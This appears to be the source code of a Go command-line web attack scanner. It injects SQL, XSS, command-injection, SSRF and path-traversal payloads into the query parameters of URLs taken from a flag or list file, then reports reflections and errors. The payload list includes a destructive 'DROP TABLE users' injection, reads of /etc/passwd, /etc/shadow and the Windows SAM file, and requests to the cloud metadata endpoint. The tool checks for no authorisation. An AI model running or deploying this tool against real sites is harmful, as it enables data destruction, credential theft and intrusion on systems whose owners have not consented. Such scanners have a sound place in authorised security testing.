package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// Define payloads for each attack type
var payloads = map[string][]string{
	"sql": {
		"';--", 
		"\";--", 
		"'; DROP TABLE users;--", 
		"\"; DROP TABLE users;--", 
		"'; WAITFOR DELAY '0:0:5';--",
		"\"; WAITFOR DELAY '0:0:5';--",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
	},
	"xss": {
		"<script>alert('XSS')</script>",
		"\"'><script>alert('XSS')</script>",
		"'><img src=x onerror=alert('XSS')>",
		"\">'><img src=x onerror=alert('XSS')>",
	},
	"commandinjection": {
		"'; ls #",
		"\"; ls #",
		"'; cat /etc/passwd #",
		"\"; cat /etc/passwd #",
		"`ls`",
		"$(ls)",
	},
	"ssrf": {
		"http://127.0.0.1:80",
		"http://169.254.169.254/latest/meta-data/",
		"http://[::]:80",
		"file:///etc/passwd",
	},
	"pathtraversal": {
		"../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
		"../../../etc/shadow",
		"..\\..\\..\\Windows\\System32\\config\\SAM",
	},
}

func checkURL(baseURL string, params url.Values, attackType string, verbose bool) {
	for param, values := range params {
		for _, value := range values {
			for _, payload := range payloads[attackType] {
				injectedParams := url.Values{}
				for k, v := range params {
					if k == param {
						injectedParams.Set(k, value+payload)
					} else {
						injectedParams[k] = v
					}
				}
				checkInjection(baseURL, injectedParams, payload, verbose)
			}
		}
	}
}

func checkInjection(baseURL string, params url.Values, payload string, verbose bool) {
	fullURL := baseURL + "?" + params.Encode()
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Printf("Failed to create request: %s\n", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Failed to make request: %s\n", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Failed to read response body: %s\n", err)
		return
	}

	responseBody := string(body)
	responseSize := len(responseBody)
	responseCode := resp.StatusCode

	statusColor := ""
	switch {
	case responseCode == 200:
		statusColor = "\033[32m" // Green
	case responseCode >= 400 && responseCode < 500:
		statusColor = "\033[33m" // Yellow
	case responseCode >= 500:
		statusColor = "\033[31m" // Red
	default:
		statusColor = "\033[0m"  // Reset
	}

	if strings.Contains(responseBody, payload) {
		fmt.Printf("Potential reflection detected at %s with payload: %s\n", fullURL, params.Encode())
	}

	if strings.Contains(responseBody, "error") || responseCode == 500 {
		fmt.Printf("Potential injection detected at %s with payload: %s\n", fullURL, params.Encode())
	} else {
		if verbose {
			fmt.Printf("%sChecked %s - No injection detected\n", statusColor, fullURL)
			fmt.Printf("Response Code: %d, Response Size: %d\033[0m\n", responseCode, responseSize)
		} else {
			fmt.Printf("%sChecked %s [%s] - Response Code: %d, Response Size: %d bytes\033[0m\n", statusColor, fullURL, payload, responseCode, responseSize)
		}
	}
}

func main() {
	attackType := flag.String("attack", "sql", "Type of attack: sql, xss, commandinjection, ssrf, pathtraversal")
	listFile := flag.String("l", "", "File with list of URLs")
	directURL := flag.String("d", "", "Direct URL to check")
	verbose := flag.Bool("v", false, "Set verbosity to high for more information")
	flag.Parse()

	if *listFile == "" && *directURL == "" {
		fmt.Println("Please provide a URL with -d or a file with -l")
		flag.Usage()
		return
	}

	urls := []string{}
	if *listFile != "" {
		file, err := os.Open(*listFile)
		if err != nil {
			fmt.Printf("Failed to open file: %s\n", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			urls = append(urls, scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("Failed to read file: %s\n", err)
			return
		}
	} else if *directURL != "" {
		urls = append(urls, *directURL)
	}

	for _, baseURL := range urls {
		u, err := url.Parse(baseURL)
		if err != nil {
			fmt.Printf("Invalid URL: %s\n", err)
			continue
		}

		params := u.Query()
		checkURL(u.Scheme+"://"+u.Host+u.Path, params, *attackType, *verbose)
	}
}
